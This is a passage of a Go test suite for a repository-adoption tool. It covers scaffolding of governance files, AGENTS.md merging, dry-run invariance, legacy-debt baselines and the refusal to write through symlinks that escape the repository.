package adopt

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// maxSnapshotEntries bounds the tree walk of snapshotTree (HISS-02).
const maxSnapshotEntries = 10000

// requireGit skips tests that need a real git binary.
func requireGit(t *testing.T) string {
	t.Helper()
	gitPath, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git binary required")
	}
	return gitPath
}

// initTestGit creates the minimal layout git recognises as a repository (HEAD, objects/,
// refs/) so that git discovery stops at dir instead of walking up into an enclosing
// checkout when the test temp dir lives inside one.
func initTestGit(t *testing.T, dir string) {
	t.Helper()
	gitDir := filepath.Join(dir, ".git")
	for _, sub := range []string{"objects", "refs"} {
		if err := os.MkdirAll(filepath.Join(gitDir, sub), 0o755); err != nil {
			t.Fatalf("mkdir .git/%s: %v", sub, err)
		}
	}
	if err := os.WriteFile(filepath.Join(gitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644); err != nil {
		t.Fatalf("write HEAD: %v", err)
	}
}

// hermeticPath restricts PATH to a stub directory plus the directory holding git, so
// that no lefthook or other tool from the developer machine is ever executed.
func hermeticPath(t *testing.T, stubDir string) {
	t.Helper()
	if os.PathSeparator == '\\' {
		t.Skip("POSIX shell stubs required")
	}
	gitPath := requireGit(t)
	t.Setenv("PATH", stubDir+string(os.PathListSeparator)+filepath.Dir(gitPath))
}

// writeStub writes an executable shell stub named name into dir.
func writeStub(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte("#!/bin/sh\n"+body), 0o700); err != nil {
		t.Fatalf("write stub %s: %v", name, err)
	}
}

// newTestRepo creates a hermetic leaf repository under a fresh temp dir. lefthook is
// stubbed to fail so that the deterministic fallback hook path is exercised.
func newTestRepo(t *testing.T, name string) string {
	t.Helper()
	stubDir := t.TempDir()
	writeStub(t, stubDir, "lefthook", "exit 1\n")
	hermeticPath(t, stubDir)
	repoPath := filepath.Join(t.TempDir(), name)
	if err := os.MkdirAll(repoPath, 0o755); err != nil {
		t.Fatalf("mkdir repo: %v", err)
	}
	initTestGit(t, repoPath)
	return repoPath
}

func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", filepath.Dir(path), err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

// restoreMode makes a deliberately unreadable fixture removable again by t.TempDir.
func restoreMode(t *testing.T, path string) {
	t.Helper()
	if err := os.Chmod(path, 0o644); err != nil {
		t.Logf("restore mode of %s: %v", path, err)
	}
}

func mustRead(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	return string(data)
}

// snapshotTree maps every entry under dir to a content hash (or "dir").
func snapshotTree(t *testing.T, dir string) map[string]string {
	t.Helper()
	snap := make(map[string]string)
	count := 0
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		count++
		if count > maxSnapshotEntries {
			return filepath.SkipAll
		}
		rel, relErr := filepath.Rel(dir, path)
		if relErr != nil {
			return relErr
		}
		if info.IsDir() {
			snap[rel] = "dir"
			return nil
		}
		data, readErr := os.ReadFile(path)
		if readErr != nil {
			return readErr
		}
		sum := sha256.Sum256(data)
		snap[rel] = hex.EncodeToString(sum[:])
		return nil
	})
	if err != nil {
		t.Fatalf("snapshot %s: %v", dir, err)
	}
	return snap
}

func assertTreeUnchanged(t *testing.T, before, after map[string]string) {
	t.Helper()
	if len(before) != len(after) {
		t.Fatalf("dry-run changed the tree: %d entries before, %d after", len(before), len(after))
	}
	for rel, hash := range before {
		if after[rel] != hash {
			t.Fatalf("dry-run modified %s", rel)
		}
	}
}

func assertNoIssues(t *testing.T, rep *AdoptReport) {
	t.Helper()
	if len(rep.Errors) > 0 {
		t.Fatalf("unexpected report errors: %v", rep.Errors)
	}
}

func hasAction(rep *AdoptReport, path, action string) bool {
	for _, d := range rep.ActionDetails {
		if d.Path == path && d.Action == action {
			return true
		}
	}
	return false
}

func contains(list []string, item string) bool {
	for _, v := range list {
		if v == item {
			return true
		}
	}
	return false
}

// =========================================================================
// Positive 3D Tests
// =========================================================================

func TestAdopt_Positive_Greenfield(t *testing.T) {
	repoPath := newTestRepo(t, "new-service")
	mustWrite(t, filepath.Join(repoPath, "go.mod"), "module github.com/test/service\n")

	report, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt greenfield failed: %v", err)
	}
	assertNoIssues(t, report)
	assertAdoptedLock(t, repoPath)
	if report.State != StateGreenfield {
		t.Fatalf("expected state greenfield, got: %s", report.State)
	}
	if report.Archetype != "framework" {
		t.Fatalf("expected framework archetype, got: %s", report.Archetype)
	}

	expectedCreated := []string{
		".standards.yaml", ".standards.lock", ".standards-baseline.json", "AGENTS.md", "CLAUDE.md",
		".devcontainer/devcontainer.json", "Makefile", ".gitignore", ".vscode/settings.json",
		".git/hooks/pre-commit",
	}
	for _, ef := range expectedCreated {
		if !contains(report.CreatedFiles, ef) {
			t.Errorf("expected %s in CreatedFiles, got %v", ef, report.CreatedFiles)
		}
		if contains(report.ReconciledFiles, ef) {
			t.Errorf("greenfield file %s must not be reported as reconciled", ef)
		}
		if _, err := os.Stat(filepath.Join(repoPath, ef)); err != nil {
			t.Errorf("expected file %s to exist after greenfield adoption: %v", ef, err)
		}
	}

	agents := mustRead(t, filepath.Join(repoPath, "AGENTS.md"))
	if !strings.HasSuffix(strings.TrimSpace(agents), harnessEndMarker) {
		t.Error("greenfield AGENTS.md must end with the harness end marker")
	}
	makefile := mustRead(t, filepath.Join(repoPath, "Makefile"))
	if !strings.Contains(makefile, "verify-all: compile-context-verify audit test") {
		t.Errorf("greenfield verify-all must run the real gates, got:\n%s", makefile)
	}
	if strings.Contains(makefile, "Running verification...") {
		t.Error("greenfield verify-all must not be an echo placeholder")
	}
	hook := mustRead(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit"))
	if !strings.Contains(hook, fallbackPreCommitMarker) || strings.Contains(hook, "./bin/") {
		t.Errorf("fallback hook must be praetor-managed and never execute a repository-relative binary:\n%s", hook)
	}
}

func TestAdopt_Positive_PartialAndDryRun(t *testing.T) {
	repoPath := newTestRepo(t, "partial-repo")
	mustWrite(t, filepath.Join(repoPath, ".standards.yaml"), "version: 1\n")

	before := snapshotTree(t, repoPath)
	repDry, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, DryRun: true})
	if err != nil {
		t.Fatalf("Adopt dry-run failed: %v", err)
	}
	assertNoIssues(t, repDry)
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	if repDry.State != StatePartial {
		t.Fatalf("expected partial state, got: %s", repDry.State)
	}

	repLive, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt live failed: %v", err)
	}
	assertNoIssues(t, repLive)
	if _, err := os.Stat(filepath.Join(repoPath, ".standards.lock")); err != nil {
		t.Fatal("live adopt should create missing .standards.lock")
	}
	if !contains(repLive.ReconciledFiles, ".standards.yaml") {
		t.Fatalf("expected the pre-existing manifest in ReconciledFiles, got %v", repLive.ReconciledFiles)
	}

	// Plan and execution classify the same files identically (dry-run vs live).
	for _, f := range repDry.CreatedFiles {
		if f == ".git/hooks/pre-commit" {
			continue // hooks are only activated in live mode
		}
		if !contains(repLive.CreatedFiles, f) {
			t.Errorf("dry-run planned %s as created but the live run reported it differently", f)
		}
	}
}

func TestAdopt_Positive_BrownfieldWithDebtRatcheting(t *testing.T) {
	repoPath := newTestRepo(t, "legacy-repo")
	mustWrite(t, filepath.Join(repoPath, "main.go"), "package main\nfunc run() {\n\t_ = doSomething()\n}\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, RecordBaseline: true})
	if err != nil {
		t.Fatalf("Adopt brownfield failed: %v", err)
	}
	assertNoIssues(t, rep)
	if rep.LegacyDebtCount != 1 {
		t.Fatalf("expected 1 legacy infraction recorded, got: %d", rep.LegacyDebtCount)
	}
	if len(mustRead(t, filepath.Join(repoPath, ".standards-baseline.json"))) == 0 {
		t.Fatal("baseline file should not be empty")
	}

	// A second live run on the now fully scaffolded repository observes brownfield state.
	rep2, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("second Adopt failed: %v", err)
	}
	assertNoIssues(t, rep2)
	if rep2.State != StateBrownfield {
		t.Fatalf("expected brownfield state on the second run, got %s", rep2.State)
	}
	if rep2.LegacyDebtCount != 1 {
		t.Fatalf("existing baseline debt must be reported, got %d", rep2.LegacyDebtCount)
	}
}

func TestAdopt_Positive_ExplicitFacetsAndSkipGitValidation(t *testing.T) {
	stubDir := t.TempDir()
	writeStub(t, stubDir, "lefthook", "exit 1\n")
	hermeticPath(t, stubDir)
	repoPath := filepath.Join(t.TempDir(), "no-git")
	if err := os.MkdirAll(repoPath, 0o755); err != nil {
		t.Fatal(err)
	}

	rep, err := Adopt(context.Background(), AdoptOptions{
		LockSourceRoot:    newAdoptLockSource(t),
		Path:              repoPath,
		Facets:            []string{"custom:facet"},
		SkipGitValidation: true,
		DryRun:            true,
	})
	if err != nil {
		t.Fatalf("Adopt with SkipGitValidation failed: %v", err)
	}
	assertNoIssues(t, rep)
	if len(rep.Facets) != 1 || rep.Facets[0] != "custom:facet" {
		t.Fatalf("explicit facets must be honoured, got %v", rep.Facets)
	}
}

func TestAdopt_Positive_ForceRegeneratesScaffolds(t *testing.T) {
	repoPath := newTestRepo(t, "force-repo")
	mustWrite(t, filepath.Join(repoPath, "lefthook.yml"), "pre-commit:\n  commands:\n    custom:\n      run: echo custom\n")
	mustWrite(t, filepath.Join(repoPath, ".config", "labels.yaml"), "version: 0\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: true})
	if err != nil {
		t.Fatalf("Adopt --force failed: %v", err)
	}
	assertNoIssues(t, rep)
	if !contains(rep.CreatedFiles, "lefthook.yml") || !contains(rep.CreatedFiles, ".config/labels.yaml") {
		t.Fatalf("--force must regenerate scaffolds, got created=%v", rep.CreatedFiles)
	}
	if mustRead(t, filepath.Join(repoPath, "lefthook.yml")) != buildLefthookYAML() {
		t.Error("--force must replace lefthook.yml with the praetor configuration")
	}
	if !contains(rep.CreatedFiles, ".git/hooks/pre-commit") {
		t.Errorf("praetor-written lefthook.yml must be activated, got %v", rep.CreatedFiles)
	}
}

// =========================================================================
// Negative 3D Tests
// =========================================================================

func TestAdopt_Negative_NilContext(t *testing.T) {
	_, err := Adopt(nil, AdoptOptions{Path: t.TempDir()}) //nolint:staticcheck // exercising the nil-context contract
	if err == nil {
		t.Fatal("expected error with nil context")
	}
}

func TestAdopt_Negative_CancelledContext(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := Adopt(ctx, AdoptOptions{Path: t.TempDir()}); err == nil {
		t.Fatal("expected error with cancelled context")
	}
}

func TestAdopt_Negative_NonExistentPath(t *testing.T) {
	missing := filepath.Join(t.TempDir(), "does", "not", "exist")
	if _, err := Adopt(context.Background(), AdoptOptions{Path: missing}); err == nil {
		t.Fatal("expected error with non-existent path")
	}
}

func TestAdopt_Negative_PathIsFileNotDir(t *testing.T) {
	file := filepath.Join(t.TempDir(), "file.txt")
	mustWrite(t, file, "x")
	if _, err := Adopt(context.Background(), AdoptOptions{Path: file}); err == nil {
		t.Fatal("expected error when path is a regular file")
	}
}

func TestAdopt_Negative_SymlinkedTargetsAreRefused(t *testing.T) {
	outside := t.TempDir()
	for _, name := range []string{"AGENTS.md", "README.md", "Makefile"} {
		repoPath := newTestRepo(t, "symlink-"+strings.ToLower(strings.TrimSuffix(name, ".md")))
		victim := filepath.Join(outside, name+".secret")
		mustWrite(t, victim, "SECRET-KEY-MATERIAL\n")
		if err := os.Symlink(victim, filepath.Join(repoPath, name)); err != nil {
			t.Skipf("symlinks unavailable: %v", err)
		}

		rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
		if err == nil {
			t.Fatalf("%s: expected adoption to refuse a symlink escaping the repository", name)
		}
		if rep == nil {
			t.Fatalf("%s: a failed run must still return the partial report", name)
		}
		if got := mustRead(t, victim); got != "SECRET-KEY-MATERIAL\n" {
			t.Fatalf("%s: symlink target was modified through the link:\n%s", name, got)
		}
	}
}

func TestAdopt_Negative_DanglingSymlinkIsNotCreatedThrough(t *testing.T) {
	repoPath := newTestRepo(t, "dangling")
	target := filepath.Join(t.TempDir(), "planted", "AGENTS.md")
	if err := os.Symlink(target, filepath.Join(repoPath, "AGENTS.md")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath}); err == nil {
		t.Fatal("expected adoption to refuse a dangling symlink")
	}
	if _, err := os.Lstat(target); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("adoption must not create the symlink target, stat err=%v", err)
	}
}

func TestAdopt_Negative_PartialReportOnFailure(t *testing.T) {
	repoPath := newTestRepo(t, "partial-failure")
	mustWrite(t, filepath.Join(repoPath, "README.md"), "all:\n")
	if os.Geteuid() == 0 {
		t.Skip("root ignores file modes")
	}
	if err := os.Chmod(filepath.Join(repoPath, "README.md"), 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { restoreMode(t, filepath.Join(repoPath, "README.md")) })

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err == nil {
		t.Fatal("expected an error for an unreadable README")
	}
	if rep == nil || !contains(rep.CreatedFiles, ".standards.yaml") {
		t.Fatalf("partial report must list the files written before the failure, got %+v", rep)
	}
}

func TestAdopt_Negative_UnreadableReadmeIsAnError(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root ignores file modes")
	}
	repoPath := newTestRepo(t, "bad-readme")
	readme := filepath.Join(repoPath, "README.md")
	mustWrite(t, readme, "# x\n")
	if err := os.Chmod(readme, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { restoreMode(t, readme) })

	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath}); err == nil {
		t.Fatal("an existing but unreadable README.md must fail adoption, not be skipped silently")
	}
}

func TestAdopt_Negative_ScanTimeoutFailsInsteadOfEmptyBaseline(t *testing.T) {
	repoPath := newTestRepo(t, "scan-timeout")
	mustWrite(t, filepath.Join(repoPath, "main.go"), "package main\nfunc run() {\n\t_ = doSomething()\n}\n")

	ctx, cancel := context.WithCancel(context.Background())
	// Cancel right before the baseline step: the scan observes the cancelled context.
	steps := []adoptStep{func(context.Context, *adoptSession) error { cancel(); return nil }, reconcileBaseline}
	s := &adoptSession{repoPath: repoPath, repoName: "scan-timeout", arch: "framework",
		opts: AdoptOptions{Path: repoPath, RecordBaseline: true}, report: &AdoptReport{DebtBreakdown: map[string]int{}}}
	var err error
	for i := 0; i < len(steps) && i < maxAdoptSteps; i++ {
		if err = steps[i](ctx, s); err != nil {
			break
		}
	}
	if err == nil {
		t.Fatal("an interrupted scan must fail the baseline step")
	}
	if _, statErr := os.Stat(filepath.Join(repoPath, ".standards-baseline.json")); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatal("no baseline may be written when the scan did not complete")
	}
}

// =========================================================================
// Boundary 3D Tests
// =========================================================================

func TestAdopt_Boundary_EmptyRepoPathDefaults(t *testing.T) {
	repoPath := newTestRepo(t, "empty")
	before := snapshotTree(t, repoPath)

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, DryRun: true})
	if err != nil {
		t.Fatalf("Adopt on empty repo failed: %v", err)
	}
	assertNoIssues(t, rep)
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	if rep.Archetype != "template-seed" {
		t.Fatalf("expected template-seed archetype for empty dir, got: %s", rep.Archetype)
	}
	if len(rep.Facets) != 4 {
		t.Fatalf("expected 4 default facets, got: %d", len(rep.Facets))
	}
}

func TestAdopt_Boundary_EmptyPathMeansCwd(t *testing.T) {
	repoPath := newTestRepo(t, "cwd-repo")
	t.Chdir(repoPath)
	before := snapshotTree(t, repoPath)
	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: "", DryRun: true})
	if err != nil {
		t.Fatalf("empty path must resolve to the working directory: %v", err)
	}
	assertNoIssues(t, rep)
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
}

func TestDetectState_Boundary(t *testing.T) {
	tmpDir := t.TempDir()
	if s := DetectState(tmpDir); s != StateGreenfield {
		t.Fatalf("expected greenfield for empty dir, got: %s", s)
	}
	mustWrite(t, filepath.Join(tmpDir, "AGENTS.md"), "rules")
	if s := DetectState(tmpDir); s != StatePartial {
		t.Fatalf("expected partial for dir with only AGENTS.md, got: %s", s)
	}
	mustWrite(t, filepath.Join(tmpDir, ".standards.yaml"), "manifest")
	mustWrite(t, filepath.Join(tmpDir, ".standards.lock"), "lock")
	if s := DetectState(tmpDir); s != StatePartial {
		t.Fatalf("expected partial while the baseline is missing, got: %s", s)
	}
	mustWrite(t, filepath.Join(tmpDir, ".standards-baseline.json"), "{}")
	if s := DetectState(tmpDir); s != StateBrownfield {
		t.Fatalf("expected brownfield for dir with all files, got: %s", s)
	}
}

func TestDetectState_Negative_NonexistentPath(t *testing.T) {
	if s := DetectState(filepath.Join(t.TempDir(), "missing")); s != StateGreenfield {
		t.Fatalf("a nonexistent path has no artefacts and is greenfield, got %s", s)
	}
}

func TestResolveArchetype_Markers(t *testing.T) {
	tests := []struct {
		filename string
		expected string
	}{
		{"meson.build", "native-gpu-systems"},
		{"CMakeLists.txt", "native-gpu-systems"},
		{"Cargo.toml", "native-gpu-systems"},
		{"go.mod", "framework"},
		{"pubspec.yaml", "app-service"},
		{"pom.xml", "app-service"},
		{"build.gradle", "app-service"},
		{"build.gradle.kts", "app-service"},
		{"package.json", "app-service"},
		{"pyproject.toml", "app-service"},
		{"Dockerfile", "container-image"},
	}
	for _, tc := range tests {
		tmpDir := t.TempDir()
		mustWrite(t, filepath.Join(tmpDir, tc.filename), "dummy")
		if arch := resolveArchetype(tmpDir, ""); arch != tc.expected {
			t.Errorf("for marker %s: expected %s, got %s", tc.filename, tc.expected, arch)
		}
	}
	// Precedence: meson beats go.mod; an explicit profile beats every marker.
	tmpDir := t.TempDir()
	mustWrite(t, filepath.Join(tmpDir, "meson.build"), "project('vmafx')")
	mustWrite(t, filepath.Join(tmpDir, "go.mod"), "module vmafx")
	if arch := resolveArchetype(tmpDir, ""); arch != "native-gpu-systems" {
		t.Fatalf("expected native-gpu-systems for meson project, got: %s", arch)
	}
	if arch := resolveArchetype(tmpDir, "custom"); arch != "custom" {
		t.Fatalf("explicit profile must win, got %s", arch)
	}
	if arch := resolveArchetype(t.TempDir(), ""); arch != "template-seed" {
		t.Fatalf("no markers must yield template-seed, got %s", arch)
	}
}

func TestAdopt_MultiLanguageLegacyDebt(t *testing.T) {
	repoPath := newTestRepo(t, "polyglot")
	mustWrite(t, filepath.Join(repoPath, "kernel.c"), "#include <stdio.h>\nvoid test() {\n    while (1) {}\n    strcpy(dst, src);\n}\n")
	mustWrite(t, filepath.Join(repoPath, "script.py"), "while True:\n    try:\n        pass\n    except:\n        pass\n")
	mustWrite(t, filepath.Join(repoPath, "lib.rs"), "fn main() {\n    let val = Some(1).unwrap();\n}\n")

	before := snapshotTree(t, repoPath)
	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "native-gpu-systems", RecordBaseline: true, DryRun: true})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	if rep.LegacyDebtCount < 5 {
		t.Fatalf("expected at least 5 legacy infractions across C, Python, and Rust, got: %d", rep.LegacyDebtCount)
	}
	for _, rule := range []string{"HISS-02", "HISS-07", "HISS-08"} {
		if rep.DebtBreakdown[rule] == 0 {
			t.Errorf("expected %s infractions, got none", rule)
		}
	}
}

func TestAdopt_NASARule4_FunctionLengthLimit(t *testing.T) {
	repoPath := newTestRepo(t, "long-funcs")
	var cCode, pyCode strings.Builder
	cCode.WriteString("void long_c_function() {\n")
	pyCode.WriteString("def long_python_function():\n")
	for i := 0; i < 70; i++ {
		cCode.WriteString("    int x = 1;\n")
		pyCode.WriteString("    x = 1\n")
	}
	cCode.WriteString("}\n")
	mustWrite(t, filepath.Join(repoPath, "long.c"), cCode.String())
	mustWrite(t, filepath.Join(repoPath, "long.py"), pyCode.String())

	before := snapshotTree(t, repoPath)
	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", RecordBaseline: true, DryRun: true})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	if rep.DebtBreakdown["HISS-04"] < 2 {
		t.Errorf("expected at least 2 HISS-04 infractions for functions > 60 LOC, got: %d", rep.DebtBreakdown["HISS-04"])
	}
}

// =========================================================================
// AGENTS.md merge behaviour
// =========================================================================

func TestAdopt_ExistingAgentsMDMerged(t *testing.T) {
	repoPath := newTestRepo(t, "merge-agents")
	custom := "# Custom Project Guidelines\n- Rule 1: Always check tests\n- Rule 2: Keep commits clean\n"
	mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), custom)

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	content := mustRead(t, filepath.Join(repoPath, "AGENTS.md"))
	for _, want := range []string{"Agent Operating Harness", "## Core Directives & Invariants", "# Custom Project Guidelines", harnessEndMarker} {
		if !strings.Contains(content, want) {
			t.Errorf("expected merged AGENTS.md to contain %q", want)
		}
	}
	if !hasAction(rep, "AGENTS.md", actionMerge) {
		t.Errorf("expected a merge action for AGENTS.md, got %v", rep.ActionDetails)
	}
}

func TestAdopt_AgentsMD_ForcePreservesCustomInstructions(t *testing.T) {
	cases := map[string]string{
		"legacy-separator":           "<!-- markdownlint-disable -->\n# old Agent Operating Harness\n\n## Core Directives & Invariants\nold table\n\n---\n\n# Custom Repo Instructions\nDon't touch this proprietary text!\n",
		"legacy-footer-no-separator": "# old Agent Operating Harness\n\n## Core Directives & Invariants\nold table\n\n## Primary Verification Commands\n\n```bash\nmake verify-all\n```\n\n# Custom Repo Instructions\nDon't touch this proprietary text!\n",
	}
	for name, initial := range cases {
		repoPath := newTestRepo(t, name)
		mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), initial)

		rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
		if err != nil {
			t.Fatalf("%s: Adopt failed: %v", name, err)
		}
		assertNoIssues(t, rep)
		content := mustRead(t, filepath.Join(repoPath, "AGENTS.md"))
		if !strings.Contains(content, "Modernized NASA JPL Power-of-10") {
			t.Errorf("%s: expected updated harness", name)
		}
		if !strings.Contains(content, "# Custom Repo Instructions") || !strings.Contains(content, "Don't touch this proprietary text!") {
			t.Errorf("%s: expected custom repo instructions to be preserved, got:\n%s", name, content)
		}
		if strings.Contains(content, "old table") {
			t.Errorf("%s: the old harness body must be replaced", name)
		}

		// A second --force run is idempotent.
		if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true}); err != nil {
			t.Fatalf("%s: second Adopt failed: %v", name, err)
		}
		if again := mustRead(t, filepath.Join(repoPath, "AGENTS.md")); again != content {
			t.Errorf("%s: --force must be idempotent, diff:\n%s\n---\n%s", name, content, again)
		}
	}
}

func TestAdopt_AgentsMD_ForceRefusesUnknownBoundary(t *testing.T) {
	repoPath := newTestRepo(t, "unknown-boundary")
	initial := "# Something Agent Operating Harness\nhand written rules without any separator\n"
	mustWrite(t, filepath.Join(repoPath, "AGENTS.md"), initial)

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: true})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	if got := mustRead(t, filepath.Join(repoPath, "AGENTS.md")); got != initial {
		t.Fatalf("AGENTS.md must be left untouched when the harness boundary is unknown, got:\n%s", got)
	}
	if len(rep.Errors) == 0 || !strings.Contains(rep.Errors[0], "AGENTS.md") {
		t.Fatalf("expected a report error naming AGENTS.md, got %v", rep.Errors)
	}
}

func TestSplitHarnessTail_Boundary(t *testing.T) {
	if tail, ok := splitHarnessTail("no harness here"); ok || tail != "" {
		t.Fatalf("expected no boundary, got ok=%v tail=%q", ok, tail)
	}
	if tail, ok := splitHarnessTail("x " + harnessEndMarker); !ok || tail != "" {
		t.Fatalf("marker with empty tail must be ok with empty tail, got ok=%v tail=%q", ok, tail)
	}
	if tail, ok := splitHarnessTail("## Primary Verification Commands\n```bash\nunterminated"); ok || tail != "" {
		t.Fatalf("unterminated footer fence must not be a boundary, got ok=%v tail=%q", ok, tail)
	}
	if tail, ok := splitHarnessTail("a\n---\n---\nfront matter\n"); !ok || tail != "front matter" {
		t.Fatalf("only one separator is stripped, got ok=%v tail=%q", ok, tail)
	}
}

// =========================================================================
// Governance text and README behaviour
// =========================================================================

func TestAdopt_GovernanceTextsScaffolded(t *testing.T) {
	repoPath := newTestRepo(t, "governance")
	mustWrite(t, filepath.Join(repoPath, "README.md"), "# My Awesome Project\nSome description here.\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	for _, f := range []string{"CONTRIBUTING.md", ".github/pull_request_template.md", "SECURITY.md", "docs/adr/README.md", "docs/adr/0000-template.md"} {
		if !fileExists(filepath.Join(repoPath, f)) {
			t.Errorf("expected %s to be created", f)
		}
	}
	content := mustRead(t, filepath.Join(repoPath, "README.md"))
	if !strings.Contains(content, "HISS--16%20Compliant") {
		t.Errorf("a debt-free repository gets the compliant badge, got:\n%s", content)
	}
	if !strings.Contains(content, "## Standards & Governance") || !strings.Contains(content, "# My Awesome Project") {
		t.Errorf("expected governance table and preserved heading, got:\n%s", content)
	}
}

func TestAdopt_ReadmeBadgeReflectsBaselinedDebt(t *testing.T) {
	repoPath := newTestRepo(t, "debt-badge")
	mustWrite(t, filepath.Join(repoPath, "README.md"), "# Legacy\n")
	mustWrite(t, filepath.Join(repoPath, "main.go"), "package main\nfunc run() {\n\t_ = doSomething()\n}\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, RecordBaseline: true})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	content := mustRead(t, filepath.Join(repoPath, "README.md"))
	if strings.Contains(content, "Compliant-brightgreen") {
		t.Errorf("a repository with baselined debt must not claim compliance:\n%s", content)
	}
	if !strings.Contains(content, "1%20baselined") {
		t.Errorf("badge must carry the baselined count, got:\n%s", content)
	}
}

func TestBuildReadmeBadge_Boundary(t *testing.T) {
	if !strings.Contains(buildReadmeBadge(0), "brightgreen") {
		t.Error("zero debt must be green")
	}
	if b := buildReadmeBadge(1); !strings.Contains(b, "yellow") || !strings.Contains(b, "(1%20baselined)") {
		t.Errorf("one infraction must be yellow with a count, got %s", b)
	}
	if got := injectReadmeBadge("# T", "B\n"); got != "# T\n\nB\n" {
		t.Errorf("heading without newline: %q", got)
	}
	if got := injectReadmeBadge("plain", "B\n"); got != "B\n\nplain" {
		t.Errorf("no heading: %q", got)
	}
}

func TestAdopt_ExistingMakefileAppended(t *testing.T) {
	repoPath := newTestRepo(t, "makefile")
	mustWrite(t, filepath.Join(repoPath, "Makefile"), "all:\n\t@echo \"Building...\"\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	content := mustRead(t, filepath.Join(repoPath, "Makefile"))
	for _, want := range []string{"verify-all:", "compile-context:", "all:\n\t@echo \"Building...\""} {
		if !strings.Contains(content, want) {
			t.Errorf("expected Makefile to contain %q", want)
		}
	}
	if !hasAction(rep, "Makefile", actionAppend) {
		t.Errorf("expected an append action for Makefile")
	}
}

func TestBuildMakefile_DetectedCommands(t *testing.T) {
	for _, tc := range []struct{ marker, command string }{
		{"go.mod", "'go' 'test' '-v' '-race' './...'"},
		{"Cargo.toml", "'cargo' 'test' '--locked'"},
	} {
		t.Run(tc.marker, func(t *testing.T) {
			root := t.TempDir()
			mustWrite(t, filepath.Join(root, tc.marker), "")
			plan, err := resolveVerificationPlan(context.Background(), root)
			if err != nil {
				t.Fatal(err)
			}
			if mk := buildMakefile(plan); !strings.Contains(mk, tc.command) {
				t.Errorf("detected toolchain command absent: %s", mk)
			}
			harness, err := buildAgentHarness("r", "unrelated-governance-profile", plan)
			if err != nil {
